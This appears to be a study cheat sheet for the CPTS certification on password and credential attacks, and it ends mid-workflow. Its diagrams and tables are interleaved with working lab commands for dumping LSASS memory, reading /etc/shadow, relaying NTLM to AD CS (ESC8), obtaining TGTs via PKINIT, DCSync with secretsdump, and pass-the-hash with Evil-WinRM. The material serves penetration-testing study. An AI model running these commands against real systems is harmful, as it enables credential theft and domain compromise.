# 🔐 CPTS Password Attacking — Master Attack Methodology & Cheat Sheet

> [!info]  
> **Purpose:** This is the consolidated methodology built from the supplied CPTS notes.
> 
> The goal is **not** to memorize isolated commands. The goal is to recognize **what you have → what you found → what attack makes sense next → what credential/material you can obtain → where that leads you**.

---

# 🧭 1. The Big Picture — Password Attack Methodology

Think of password attacks as a chain:

```text
                         🎯 TARGET
                            │
             ┌──────────────┴──────────────┐
             │                             │
      🌐 Network Services             🏢 Active Directory
             │                             │
             ▼                             ▼
      🔎 Enumeration                👤 Users / Computers
             │                             │
             └──────────────┬──────────────┘
                            ▼
                  🔍 CREDENTIAL HUNTING
                            │
              ┌─────────────┼─────────────┐
              ▼             ▼             ▼
         Files / Shares   Memory       Network Traffic
              │             │             │
              └─────────────┼─────────────┘
                            ▼
                    🔑 CREDENTIALS
                            │
          ┌─────────────────┼─────────────────┐
          ▼                 ▼                 ▼
      Password           NTLM Hash         Kerberos
          │                 │                 │
          ▼                 ▼                 ▼
     Authenticate      Pass-the-Hash     PtT / PtC
                            │                 │
                            └────────┬────────┘
                                     ▼
                              🔓 ACCESS
                                     │
                                     ▼
                         🧗 Privilege Escalation
                                     │
                                     ▼
                         🏢 Lateral Movement
                                     │
                                     ▼
                         👑 Domain Dominance
```

> [!important]  
> **The most important mindset:**  
> Don't ask only _“What password attack can I run?”_
> 
> Ask:
> 
> **“What authentication material do I currently possess, and what authentication mechanism accepts it?”**

---

# 🎯 2. First Decision — What Do I Have?

The fastest way to select a technique is to identify the credential material available to you.

|What you have|Think about|
|---|---|
|Username only|Enumeration, password spraying, default credentials|
|Username + password|Authenticate → enumerate → pivot|
|Username + NTLM hash|Pass-the-Hash|
|Kerberos `.ccache` / TGT|Pass-the-Ticket|
|Kerberos `.kirbi`|Pass-the-Ticket|
|X.509 certificate / PFX|Pass-the-Certificate / PKINIT|
|Password hash|Hash cracking|
|Encrypted archive|Protected-file cracking|
|`SAM` + `SYSTEM`|Local account hash extraction|
|`NTDS.dit` + `SYSTEM`|Domain account hash extraction|
|LSASS dump|Credential extraction|
|Browser credentials|Credential recovery|
|Network capture / PCAP|Credential hunting in traffic|
|SMB share access|Credential hunting in shares|
|Keytab|Kerberos authentication / TGT acquisition|
|`msDS-KeyCredentialLink` write access|Shadow Credentials|

---

# 🧠 3. Password Attack Decision Tree

```text
                    🔍 FOUND CREDENTIAL MATERIAL
                              │
             ┌────────────────┼────────────────┐
             │                │                │
         Password            Hash           Kerberos
             │                │                │
             ▼                ▼                ▼
       Can I login?       Crack it?       What ticket?
             │                │                │
        ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
        ▼         ▼      ▼         ▼      ▼         ▼
       YES        NO   Crack     Reuse    TGT       TGS
        │         │      │         │       │         │
        ▼         ▼      ▼         ▼       ▼         ▼
  Enumerate    Spray /  Password  PtH     PtT      Service
  privileges   attack   recovery          │       access
                                           │
                                    ┌──────┴──────┐
                                    ▼             ▼
                                  Kerberos      PKINIT
                                  ticket        certificate
                                    │             │
                                    ▼             ▼
                                   PtT           PtC
```

---

# 🌐 4. Network Services — Start Here

Before attacking passwords, identify what services are exposed.

Typical workflow:

```text
🎯 Target
   ↓
🔎 Port Scan
   ↓
🧩 Identify Services
   ↓
📖 Enumerate Each Service
   ↓
🔑 Look for Authentication
   ↓
💾 Look for Credentials / Sensitive Data
   ↓
⚔️ Choose Attack
```

## 🔎 Common Services to Think About

|Service|Typical Port|Password/Credential Angle|
|---|--:|---|
|FTP|21|Anonymous login, credentials, files|
|SSH|22|Password authentication, keys|
|SMB|445|Shares, credentials, AD|
|HTTP/HTTPS|80/443|Login pages, configuration files, credentials|
|LDAP|389/636|AD enumeration/authentication|
|Kerberos|88|Tickets, roasting, PKINIT|
|WinRM|5985/5986|Windows remote authentication|
|MSSQL|1433|Database credentials/access|
|RDP|3389|Windows authentication|

> [!tip]  
> **A service is not automatically an attack.**
> 
> Its presence tells you **where authentication happens** and therefore where credential material may be useful.

---

# 🔍 5. Credential Hunting — Where to Look

When you obtain access to a machine, don't immediately assume you need to crack something.

First hunt for credentials.

```text
🖥️ Compromised Host
       │
       ├── 📂 Files
       ├── ⚙️ Configuration
       ├── 📝 Scripts
       ├── 🗄️ Databases
       ├── 🌐 Browsers
       ├── 🔐 Credential Stores
       ├── 📜 History
       ├── 🕐 Cron / Scheduled Tasks
       ├── 🪟 Registry
       ├── 🧠 Process Memory
       └── 🌐 Network Traffic
```

---

# 🪟 6. Windows Credential Hunting

## 🔎 What to Search For

Search for terms such as:

```text
password
passwd
pwd
credential
cred
username
user
token
secret
apikey
api_key
private_key
```

Common interesting files:

```text
*.txt
*.ini
*.cfg
*.config
*.xml
*.ps1
*.yml
*.yaml
*.bat
*.cmd
*.log
```

Example:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### 🧠 Think About

```text
Application
   ↓
Configuration
   ↓
Credentials
   ↓
Account
   ↓
Authentication
   ↓
New Access
```

---

# 🧠 7. LSASS — When You Have Local Administrative Access

**LSASS (Local Security Authority Subsystem Service)** handles Windows authentication and stores/handles credential material.

If you obtain sufficient privileges, LSASS can become a major credential source.

```text
👤 Logged-in Users
       ↓
🧠 LSASS
       ↓
🔑 Authentication Material
       ↓
💾 Dump Memory
       ↓
🔎 Parse Dump
       ↓
🔑 Recover Credentials / Hashes / Tickets
```

Tools from the notes include:

- Mimikatz
    
- Pypykatz
    

Typical dump concept:

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Then:

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

> [!warning]  
> LSASS dumping generally requires elevated privileges. The important CPTS concept is recognizing **LSASS as a credential source**, not blindly running the command.

---

# 💾 8. SAM + SYSTEM + SECURITY

## 🧠 Mental Model

```text
SAM
 │
 └── Local account password hashes

SYSTEM
 │
 └── Boot key / information needed to decrypt SAM secrets

SECURITY
 │
 └── Additional local security secrets
```

If you obtain the relevant registry hives, they can be used to recover local password hashes/secrets.

### Attack Chain

```text
🔓 Elevated Access
      ↓
💾 Obtain SAM + SYSTEM (+ SECURITY)
      ↓
🔓 Extract Hashes
      ↓
🧮 Crack Hashes
      OR
      ↓
🔑 Pass-the-Hash
```

---

# 🏢 9. NTDS.dit — Domain Credential Goldmine

`NTDS.dit` is the Active Directory database on a Domain Controller.

```text
🏢 Domain Controller
       ↓
📁 NTDS.dit
       ↓
👤 Domain Accounts
       ↓
🔑 NTLM Hashes
       ↓
🧮 Crack
       OR
       ↓
🔐 Pass-the-Hash
```

Important distinction:

```text
SAM
 ↓
LOCAL accounts

NTDS.dit
 ↓
DOMAIN accounts
```

> [!important]  
> If you compromise a Domain Controller with sufficient privileges, **NTDS.dit becomes one of the most valuable credential sources in the environment.**

---

# 🔓 10. Hash Cracking — When You Have a Hash

Hash cracking is appropriate when you have a password hash and want to recover the original password.

```text
🔑 Password
    ↓
🧬 Hash
    ↓
🔍 Identify Hash Type
    ↓
📚 Wordlist / Rules / Mask
    ↓
⚡ Hashcat / John
    ↓
🔓 Recovered Password
```

## 🧠 First Question

**What hash type is this?**

Do not start cracking blindly.

---

# 🔓 11. Hashcat

General structure:

```bash
hashcat [options] hashfile [wordlist]
```

Typical attack modes include:

```text
Dictionary
Rule-based
Brute-force / Mask
Combinator
Hybrid
```

### Common CPTS Example

NTLM:

```text
Hashcat mode 1000
```

Linux SHA-512 crypt:

```text
Hashcat mode 1800
```

> [!tip]  
> **Hashcat is the engine.**
> 
> Your real skill is selecting:
> 
> **hash type → attack mode → wordlist → rules → masks**

---

# 🔐 12. John the Ripper

John is another major password-cracking tool.

Think:

```text
Hash
 ↓
Identify format
 ↓
John
 ↓
Wordlist / Rules / Incremental
 ↓
Password
```

Use John when:

- The hash format is well supported.
    
- You already have a suitable wordlist.
    
- You want convenient automatic format handling.
    
- The CPTS workflow specifically calls for John.
    

---

# 🧬 13. Password Mutations & Custom Wordlists

A generic wordlist may not contain the target password exactly.

Real passwords frequently involve mutations:

```text
Password
password
Password1
Password123
P@ssword1
Password!
P@ssw0rd!
```

## 🎯 Methodology

```text
OSINT
 ↓
Target-specific words
 ↓
Custom Wordlist
 ↓
Password Policy
 ↓
Mutations / Rules
 ↓
Hashcat / John
 ↓
Password
```

> [!important]  
> **Targeted wordlists beat blindly huge wordlists when you have useful OSINT.**

---

# 🔐 14. Password Spraying vs Stuffing vs Brute Force

These are **not the same attack**.

|Attack|Core Idea|Main Risk|
|---|---|---|
|Brute Force|Many passwords against one account|Account lockout|
|Password Spraying|One/common password against many accounts|Lockout if poorly controlled|
|Credential Stuffing|Known username/password pairs from previous breaches|Reuse|
|Default Credentials|Try vendor/common default credentials|Misconfiguration|

## 🧠 Easy Memory Trick

```text
Brute Force:
ONE USER → MANY PASSWORDS

Spraying:
MANY USERS → ONE/Few PASSWORDS

Stuffing:
MANY USERS → MANY KNOWN PASSWORD PAIRS

Default:
MANY TARGETS → KNOWN DEFAULT CREDENTIALS
```

---

# 🗃️ 15. Windows Credential Manager / Vault

Windows can store credentials for applications and services.

Important locations include Windows Credential Manager/Vault storage.

Useful enumeration:

```cmd
cmdkey /list
```

If saved credentials are available, Windows functionality such as:

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

may allow authentication using stored credentials.

Tools covered in the notes include:

- Mimikatz
    
- SharpDPAPI
    
- LaZagne
    
- DonPAPI
    

> [!important]  
> Credential Manager is important because the **password may not be visible in plaintext**, but Windows may still retain material that allows authentication.

---

# 🐧 16. Linux Authentication

Linux authentication commonly involves:

```text
/etc/passwd
     ↓
Account information

/etc/shadow
     ↓
Password hashes
```

Historically, password hashes were stored in `/etc/passwd`, but modern systems normally keep them in `/etc/shadow`.

Other relevant files include:

```text
/etc/security/opasswd
```

## 🧠 Linux Hash Workflow

```text
/etc/passwd
      +
/etc/shadow
      ↓
   unshadow
      ↓
Combined hashes
      ↓
John / Hashcat
      ↓
Password
```

Example:

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

---

# 🐧 17. Linux Credential Hunting

After obtaining Linux access, investigate:

```text
📂 Configuration files
📝 Notes
📜 Scripts
🕐 Cron jobs
🌐 Application files
🗄️ Databases
📜 Shell history
🔐 SSH keys
🔑 Keyrings
🌐 Browser data
📋 Logs
```

Useful searches:

```bash
grep -Rni "password" /path/to/search/
```

Search broadly for:

```text
password
passwd
credential
secret
token
key
api
```

Also inspect:

```text
~/.bash_history
~/.zsh_history
~/.ssh/
```

Tools from the notes include:

- Mimipenguin
    
- LaZagne
    
- Browser credential extraction techniques
    

---

# 🌐 18. Credential Hunting in Network Traffic

When you have a PCAP, don't immediately assume the traffic is useless.

First determine whether authentication is:

```text
🔓 Plaintext
OR
🔐 Encrypted
```

The notes distinguish protocols based on whether credentials can potentially be observed directly.

## Wireshark Mental Model

```text
PCAP
 ↓
Identify Protocol
 ↓
Follow Authentication Traffic
 ↓
Search for:
  password
  username
  login
  auth
 ↓
Inspect Packets
 ↓
Recover Credential Material
```

Example filter:

```text
http contains "passw"
```

Then inspect relevant packets and use **Follow / Find Packet** techniques.

Pcredz can also extract authentication material from captures.

Example:

```bash
./Pcredz -f demo.pcapng -t -v
```

> [!tip]  
> When analyzing traffic, ask:
> 
> **“Is the credential actually encrypted, or is only the transport encrypted?”**

---

# 📂 19. Credential Hunting in Network Shares

SMB shares are excellent places to find forgotten credentials.

Start with enumeration.

```bash
smbclient //10.129.234.121/IT -U mendres
```

Inside SMB:

```text
ls
pwd
cd
lcd
get
mget
```

Download large quantities of files:

```text
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Then search locally:

```bash
grep -Rni "password" ~/smb/IT/
```

Broader search:

```bash
grep -RniE 'password|passwd|passw|username|user|credential|cred|token|secret|apikey|api_key|private_key' ~/smb/IT/
```

Additional useful tools:

```bash
find
file
strings
```

## 🧠 SMB Methodology

```text
SMB
 ↓
Enumerate Shares
 ↓
Anonymous / Valid Credentials?
 ↓
Readable Share
 ↓
Download Interesting Files
 ↓
Search Locally
 ↓
Credentials
 ↓
Authenticate Elsewhere
```

> [!important]  
> **Don't only search for files named `password.txt`.**
> 
> Credentials often hide inside:
> 
> `config`, `backup`, `scripts`, `XML`, `INI`, `.ps1`, `.yml`, logs, documentation, and old project files.

---

# 🎫 20. Kerberos — Understand This Before PtT/PtC

Kerberos revolves around tickets.

```text
                  🏢 KDC
                   │
        ┌──────────┴──────────┐
        ▼                     ▼
       AS                    TGS
        │                     │
        ▼                     ▼
      TGT                  Service Ticket
        │                     │
        └──────────┬──────────┘
                   ▼
             🎯 Service
```

### TGT

**Ticket Granting Ticket**

Used to request service tickets.

### TGS

**Ticket Granting Service ticket**

Used to authenticate to a particular service.

---

# 🎫 21. Pass-the-Ticket — Windows

Use PtT when you possess a valid Kerberos ticket.

```text
🎫 Kerberos Ticket
       ↓
Import into session
       ↓
Windows believes the ticket is valid
       ↓
Access Kerberos services
```

Common tools:

- Mimikatz
    
- Rubeus
    

Mimikatz concepts:

```text
sekurlsa::tickets /export
```

Import:

```text
kerberos::ptt <ticket>
```

Rubeus can dump/import tickets and create logon contexts.

---

# 🎫 22. Pass-the-Ticket — Linux

Linux can also participate in Active Directory/Kerberos authentication.

Important concepts:

```text
ccache
keytab
KRB5CCNAME
klist
kinit
```

### Find Keytabs

```bash
find / -name *keytab* -ls 2>/dev/null
```

Inspect:

```bash
klist -k -t /path/to/keytab
```

Obtain TGT:

```bash
kinit <principal> -k -t /path/to/file.keytab
```

View tickets:

```bash
klist
```

Specify ticket cache:

```bash
export KRB5CCNAME=/tmp/ticket.ccache
```

## 🧠 Linux Kerberos Mental Model

```text
🐧 Linux Host
      ↓
AD Integrated?
      ↓
Find keytab / ccache
      ↓
Identify principal
      ↓
Obtain / reuse TGT
      ↓
Set KRB5CCNAME
      ↓
Kerberos-aware tool
      ↓
🎯 AD Resource
```

---

# 🔐 23. Pass-the-Hash — When You Have an NTLM Hash

If you have an NTLM hash but **not the plaintext password**, you may still be able to authenticate.

```text
NTLM Hash
   ↓
Pass-the-Hash
   ↓
Windows Authentication
   ↓
Remote Service
```

Common tools include:

- Evil-WinRM
    
- NetExec
    
- Impacket tools
    
- Mimikatz
    

Example:

```bash
evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>
```

> [!important]  
> **PtH ≠ password cracking.**
> 
> You do **not** need to recover the plaintext password if the authentication protocol accepts the NTLM hash.

---

# 🔐 24. Pass-the-Certificate — When You Have an X.509 Certificate

This is where **PKINIT** becomes important.

**PKINIT = Public Key Cryptography for Initial Authentication**

Instead of proving knowledge of a password, the client proves possession of the private key corresponding to a certificate.

```text
X.509 Certificate + Private Key
             ↓
           PKINIT
             ↓
          Kerberos
             ↓
            TGT
             ↓
        Authentication
```

Tools from the notes include:

- PKINITtools
    
- Certipy
    
- pyWhisker
    
- PassTheCert
    
- ntlmrelayx
    

---

# 🏢 25. AD CS — ESC8

**ESC8** involves NTLM relay against an AD CS web enrollment endpoint.

Typical flow:

```text
🎯 DC01 / Machine Account
          │
          │ coerced NTLM authentication
          ▼
       🐍 Attacker
     ntlmrelayx
          │
          │ NTLM Relay
          ▼
🏢 AD CS / Certificate Authority
       /CertSrv
          │
          │ Certificate issued
          ▼
       📜 PFX
          │
          ▼
       PKINIT
          │
          ▼
        🎫 TGT
```

## 🧠 The Critical IP Distinction

In the lab topology used in the notes:

|IP|Role|Purpose|
|---|---|---|
|`10.129.234.172`|**ADCS / Certificate Authority**|Hosts `/certsrv` web enrollment|
|`10.129.234.174`|**Domain Controller / KDC / DC01**|Kerberos, machine account, DCSync target|
|Attacker IP|**Attacker**|Runs relay/listener and receives coerced authentication|

> [!important]  
> **Do not confuse the CA with the DC.**
> 
> `10.129.234.172` = **ADCS / CA**
> 
> `10.129.234.174` = **DC / KDC**

---

# ⚔️ 26. ESC8 Attack Chain

The relay listener targets the ADCS web enrollment server:

```bash
ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
```

### IP meaning

```text
10.129.234.172
        ↑
        └── ADCS / Certificate Authority web enrollment target
```

`--http-port 8080`:

```text
Attacker's ntlmrelayx HTTP listener
                  ↓
                :8080
```

Then the machine authentication is coerced toward the attacker and relayed to ADCS.

Success indicators include:

```text
Received connection from 10.129.234.174
```

Meaning:

```text
10.129.234.174 = DC01
```

Then:

```text
attacking target http://10.129.234.172
```

Meaning:

```text
10.129.234.172 = ADCS
```

And finally:

```text
GOT CERTIFICATE!
Writing PKCS#12 certificate to ./DC01.pfx
Certificate successfully written to file
```

> [!success]  
> The important proof of success is:
> 
> **DC01$ authentication → relay → ADCS → certificate issued → PFX obtained.**

---

# 🔐 27. PKINITtools — Certificate → TGT

Once you have the PFX:

```bash
python3 gettgtpkinit.py -cert-pfx /root/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

### 🚨 Critical IP Rule

```text
-cert-pfx
   ↓
LOCAL FILE
/root/DC01.pfx

-dc-ip
   ↓
DOMAIN CONTROLLER / KDC
10.129.234.174
```

> [!important]  
> `-dc-ip` is **NOT the Certificate Authority IP**.
> 
> PKINIT communicates with the **Kerberos KDC**, which is on the Domain Controller.
> 
> Therefore:
> 
> `10.129.234.174` = DC/KDC
> 
> `10.129.234.172` = CA/ADCS

Successful output includes:

```text
Loading certificate and key from file
Requesting TGT
AS-REP encryption key
Saved TGT to file
```

Then:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

This tells Kerberos-aware applications which credential cache to use.

---

# 🏢 28. Certificate → TGT → DCSync → Administrator Hash

The certificate itself isn't necessarily the final objective.

The complete chain can be:

```text
AD CS ESC8
     ↓
DC01 certificate
     ↓
PKINIT
     ↓
DC01$ TGT
     ↓
Kerberos authentication
     ↓
DCSync
     ↓
Administrator NTLM hash
     ↓
Pass-the-Hash
     ↓
Administrator access
```

This is a **multi-stage credential attack chain**.

---

# 🩸 29. DCSync

DCSync abuses Active Directory replication functionality to request credential data from a Domain Controller when the account has the required replication privileges.

Conceptually:

```text
Valid Kerberos Identity
        ↓
Replication privileges
        ↓
DCSync
        ↓
Domain password hashes
```

Example:

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

### IP meaning

```text
10.129.234.174
        ↓
Domain Controller / KDC
```

> [!warning]  
> DRSUAPI/SPN errors during `secretsdump` are a **different stage** from PKINIT.
> 
> If PKINIT successfully produced a TGT, but `secretsdump` fails, don't immediately assume the certificate attack failed.

---

# 🔑 30. Final Step — Pass-the-Hash

Once an Administrator NTLM hash has been recovered:

```text
Administrator NTLM Hash
          ↓
      Pass-the-Hash
          ↓
       Evil-WinRM
          ↓
      Administrator
          ↓
     🎯 Target DC
```

Example structure:

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
```

Here:

```text
<DC_IP>
   ↓
Target Domain Controller

<NTLM_HASH>
   ↓
Administrator's NTLM hash
```

> [!important]  
> At this point, the attack is **Pass-the-Hash**, even though the original access path began with a certificate.
> 
> Keep the stages conceptually separate:
> 
> **Pass-the-Certificate → PKINIT → DCSync → Pass-the-Hash**

---

# 🪪 31. Shadow Credentials

Shadow Credentials abuse:

```text
msDS-KeyCredentialLink
```

This attribute can contain public-key credentials usable for PKINIT.

If an attacker has permission to modify the attribute on a target account:

```text
Write msDS-KeyCredentialLink
          ↓
Add attacker's KeyCredential
          ↓
Certificate / private key
          ↓
PKINIT
          ↓
Victim's TGT
```

BloodHound can identify relevant relationships such as:

```text
AddKeyCredentialLink
```

which indicates the ability to write the target's key credential link.

---

# 🛠️ 32. pyWhisker

Typical structure:

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <VICTIM> --action add
```

The important idea:

```text
Your Account
    ↓
Permission to modify victim
    ↓
msDS-KeyCredentialLink
    ↓
Certificate / KeyCredential
    ↓
PFX
    ↓
PKINIT
    ↓
Victim TGT
```

Notice again:

```text
--dc-ip
    ↓
DC / KDC
```

**Not the Certificate Authority.**

---

# 🎫 33. Shadow Credentials → Kerberos → Evil-WinRM

After obtaining the PFX, request the victim's TGT:

```bash
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/<VICTIM> /tmp/<victim>.ccache
```

Then:

```bash
export KRB5CCNAME=/tmp/<victim>.ccache
klist
```

You should see a TGT for the victim account.

Then, if the victim has appropriate remote-management privileges:

```bash
evil-winrm -i <DC_HOSTNAME> -r <DOMAIN>
```

---

# 🧭 34. Pass-the-Certificate vs Pass-the-Ticket vs Pass-the-Hash

|Technique|What You Possess|What You Use|Result|
|---|---|---|---|
|Pass-the-Hash|NTLM hash|Hash|Windows authentication|
|Pass-the-Ticket|Kerberos ticket|TGT/TGS|Kerberos authentication|
|Pass-the-Certificate|X.509 certificate/private key|PKINIT|Obtain Kerberos TGT|

## 🧠 Memorize This

```text
🔑 HASH
   ↓
   PtH

🎫 TICKET
   ↓
   PtT

📜 CERTIFICATE
   ↓
   PKINIT
   ↓
   TGT
   ↓
   PtT-style Kerberos access
```

---

# 🧩 35. “I Found This — What Should I Do?”

## 👤 Username + Password

```text
Credentials
    ↓
Try known services
    ↓
SMB / WinRM / SSH / LDAP / MSSQL
    ↓
Enumerate privileges
    ↓
Find next credential / access path
```

---

## 🔑 Username + NTLM Hash

```text
NTLM Hash
    ↓
Pass-the-Hash
    ↓
Evil-WinRM / SMB / other supported service
    ↓
Enumerate
```

Don't waste time cracking it automatically if direct PtH is viable.

---

## 🎫 Kerberos TGT/TGS

```text
Ticket
 ↓
Set/use ticket cache
 ↓
Kerberos-aware authentication
 ↓
Access services as ticket identity
```

---

## 📜 Certificate + Private Key

```text
Certificate
 ↓
PKINIT
 ↓
TGT
 ↓
Kerberos authentication
```

---

## 💾 SAM + SYSTEM

```text
SAM + SYSTEM
 ↓
Extract local hashes
 ↓
Crack OR PtH
```

---

## 🏢 NTDS.dit

```text
NTDS.dit + required system material
 ↓
Extract domain hashes
 ↓
Crack OR PtH
```

---

## 🧠 LSASS Dump

```text
LSASS dump
 ↓
Parse
 ↓
Identify:
  credentials
  hashes
  Kerberos material
 ↓
Choose:
  Crack
  PtH
  PtT
```

---

## 📂 SMB Share

```text
SMB
 ↓
Enumerate shares
 ↓
Read files
 ↓
Download
 ↓
grep / strings / find
 ↓
Credentials
 ↓
Authenticate elsewhere
```

---

## 🌐 PCAP

```text
PCAP
 ↓
Identify protocols
 ↓
Find authentication
 ↓
Check encryption
 ↓
Extract credential material
 ↓
Reuse / crack
```

---

# 🚨 36. Troubleshooting Cheat Sheet

## ❌ `FileNotFoundError` for PFX

Example problem:

```text
FileNotFoundError: No such file or directory
```

Think:

```text
Where did ntlmrelayx actually save the certificate?
```

If the certificate was written as:

```text
/root/DC01.pfx
```

then:

```bash
-cert-pfx /root/DC01.pfx
```

> [!important]  
> `-cert-pfx` is a **local filesystem path**.
> 
> It is not an IP address or network target.

---

## ❌ PKINIT Timeout to `:88`

If you accidentally use the CA:

```text
10.129.234.172:88
```

and receive a timeout, remember:

```text
:88 = Kerberos
      ↓
DC / KDC
```

Correct topology:

```text
CA:
10.129.234.172

DC/KDC:
10.129.234.174
```

Therefore:

```bash
-dc-ip 10.129.234.174
```

---

## ❌ `secretsdump` DRSUAPI Error

Possible output:

```text
Something went wrong with the DRSUAPI approach.
```

This does **not automatically mean PKINIT failed**.

Break the attack into stages:

```text
Certificate
   ↓
PKINIT
   ↓
TGT
   ↓
Kerberos authentication
   ↓
DCSync
```

If TGT acquisition succeeded, investigate the **DCSync/DRSUAPI stage separately**.

---

# 🧠 37. The Most Important Credential Conversion Chains

Memorize these.

## Chain 1 — Password

```text
Password
   ↓
Windows / Linux / AD Authentication
   ↓
Access
```

## Chain 2 — Hash

```text
NTLM Hash
   ├──→ Crack → Password
   │
   └──→ PtH → Access
```

## Chain 3 — Kerberos Ticket

```text
TGT/TGS
   ↓
PtT
   ↓
Kerberos Access
```

## Chain 4 — Certificate

```text
X.509 Certificate + Private Key
   ↓
PKINIT
   ↓
TGT
   ↓
Kerberos Access
```

## Chain 5 — AD CS

```text
NTLM Relay
   ↓
AD CS
   ↓
Certificate
   ↓
PKINIT
   ↓
TGT
```

## Chain 6 — Shadow Credentials

```text
Write msDS-KeyCredentialLink
   ↓
KeyCredential
   ↓
Certificate
   ↓
PKINIT
   ↓
Victim TGT
```

## Chain 7 — Domain Compromise

```text
Domain Credential
       ↓
Replication Privileges
       ↓
DCSync
       ↓
Administrator NTLM Hash
       ↓
PtH
       ↓
Administrator Access
```

---

# 🧠 38. Master CPTS Decision Tree

```text
                         🎯 COMPROMISED HOST / ACCOUNT
                                  │
                                  ▼
                         🔍 WHAT DO I HAVE?
                                  │
        ┌─────────────────────────┼──────────────────────────┐
        │                         │                          │
     PASSWORD                    HASH                    KERBEROS
        │                         │                          │
        ▼                         ▼                    ┌─────┴─────┐
  Authenticate              Can I use PtH?            TGT        TGS
        │                         │                    │           │
        ▼                         ▼                    ▼           ▼
   Enumerate                 Yes → PtH              PtT         Service
        │                         │
        ▼                         │
 Find privileges                 │
        │                         │
        └──────────────┬──────────┘
                       ▼
                🔎 FIND MORE CREDS
                       │
       ┌───────────────┼────────────────┐
       ▼               ▼                ▼
    Windows          Linux            Network
       │               │                │
   LSASS/SAM       shadow/files       PCAP/SMB
       │               │                │
       └───────────────┼────────────────┘
                       ▼
                  🔑 MORE CREDS
                       │
          ┌────────────┼─────────────┐
          ▼            ▼             ▼
        Hash        Ticket       Certificate
          │            │             │
         PtH           PtT          PKINIT
                                     │
                                     ▼
                                    TGT
                                     │
                                     ▼
                              AD Authentication
                                     │
                                     ▼
                                DCSync / ACLs
                                     │
                                     ▼
                             👑 HIGH PRIVILEGE
```

---

# 📋 39. Master “When to Use What” Cheat Sheet

|Situation|Technique|Primary Goal|
|---|---|---|
|You have a plaintext password|Authenticate|Gain access / enumerate|
|You have usernames only|Spraying / default credentials|Find valid credentials|
|You have a known breached credential pair|Credential stuffing|Test password reuse|
|You have a password hash|Hash cracking|Recover plaintext|
|You have an NTLM hash|Pass-the-Hash|Authenticate without password|
|You have a Kerberos ticket|Pass-the-Ticket|Authenticate through Kerberos|
|You have a certificate/private key|PKINIT / Pass-the-Certificate|Obtain TGT|
|You find SAM + SYSTEM|Hash extraction|Recover local hashes|
|You obtain NTDS.dit|Domain hash extraction|Recover domain hashes|
|You have LSASS dump|Credential extraction|Recover authentication material|
|You find writable `msDS-KeyCredentialLink`|Shadow Credentials|Obtain victim certificate/TGT|
|You find vulnerable AD CS enrollment|AD CS attack|Obtain certificate|
|You can relay NTLM to AD CS|ESC8|Obtain certificate|
|You have replication privileges|DCSync|Extract domain hashes|
|You find readable SMB shares|Credential hunting|Discover credentials/files|
|You have a PCAP|Traffic credential hunting|Recover exposed authentication data|
|You have encrypted archives|Archive cracking|Recover archive password|
|You have a Linux shadow file|Hash cracking|Recover Linux password|

---

# 🧰 40. Tool Selection Cheat Sheet

|Tool|Use It For|
|---|---|
|**Nmap**|Port/service enumeration|
|**NetExec**|Windows/SMB/AD enumeration and authentication testing|
|**Impacket**|AD, SMB, Kerberos, credential attacks|
|**Mimikatz**|Windows credential/ticket operations|
|**Rubeus**|Kerberos enumeration and ticket operations|
|**Pypykatz**|Parsing LSASS dumps|
|**Hashcat**|Password/hash cracking|
|**John the Ripper**|Password/hash cracking|
|**LaZagne**|Credential hunting|
|**Mimipenguin**|Linux credential extraction|
|**smbclient**|SMB share interaction|
|**Pcredz**|Credential extraction from network captures|
|**Wireshark**|PCAP analysis|
|**PKINITtools**|Certificate → Kerberos TGT|
|**Certipy**|AD CS enumeration/attacks|
|**pyWhisker**|Shadow Credentials|
|**PassTheCert**|Certificate-based authentication/actions|
|**ntlmrelayx**|NTLM relay|
|**Evil-WinRM**|Windows remote access / PtH / Kerberos|
|**BloodHound**|AD relationship/attack-path analysis|
|**KeyTabExtract**|Extract information from Kerberos keytabs|

---

# 🧠 41. CPTS Mental Models to Memorize

> [!tip]
> 
> ### 🔑 Credential Material Is the Currency
> 
> Every credential artifact can potentially be converted into another form:
> 
> ```text
> Password
>    ↓
> Authentication
> 
> Hash
>    ↓
> PtH OR Crack
> 
> Ticket
>    ↓
> PtT
> 
> Certificate
>    ↓
> PKINIT
>    ↓
> TGT
> 
> TGT
>    ↓
> Kerberos Authentication
> ```

> [!tip]
> 
> ### 🏢 In Active Directory, Think in Identities
> 
> Don't think only:
> 
> **“I compromised this machine.”**
> 
> Think:
> 
> **“Which identity can I become?”**
> 
> ```text
> Local User
>    ↓
> Domain User
>    ↓
> Privileged User
>    ↓
> Computer Account
>    ↓
> Administrator
>    ↓
> Domain Dominance
> ```

> [!important]
> 
> ### 🎯 Every Finding Should Trigger a Question
> 
> **Found a password?**  
> → Where else can it authenticate?
> 
> **Found an NTLM hash?**  
> → Can I PtH or crack it?
> 
> **Found a Kerberos ticket?**  
> → Which identity/service does it represent?
> 
> **Found a certificate?**  
> → Can I use PKINIT?
> 
> **Found AD CS?**  
> → Are there certificate enrollment/relay weaknesses?
> 
> **Found `msDS-KeyCredentialLink` write access?**  
> → Shadow Credentials?
> 
> **Found NTDS.dit?**  
> → Domain hashes?
> 
> **Found replication privileges?**  
> → DCSync?
> 
> **Found an SMB share?**  
> → What credentials or sensitive files are inside?

---

# ⚡ 42. CPTS Quick-Reference Workflow

When under time pressure:

```text
1️⃣ ENUMERATE
   ↓
2️⃣ IDENTIFY SERVICES
   ↓
